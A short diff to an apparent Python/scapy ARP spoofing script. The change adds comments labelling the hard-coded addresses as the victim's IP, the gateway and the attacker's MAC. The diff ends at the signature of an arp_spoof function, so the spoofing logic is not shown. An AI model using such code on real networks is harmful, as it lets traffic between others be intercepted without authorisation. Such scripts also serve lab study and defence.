@@ -1,9 +1,9 @@
 from scapy.all import ARP, send
 import time
 
-target_ip = "192.168.50.200"  
-router_ip = "192.168.50.1"   
-my_mac = "00:11:22:33:44:55"
+target_ip = "192.168.50.200" # Victim's IP address 
+router_ip = "192.168.50.1"   # Gateway IP address
+my_mac = "00:11:22:33:44:55" # Attacker's MAC address
 
 
 def arp_spoof(target_ip, spoof_ip):
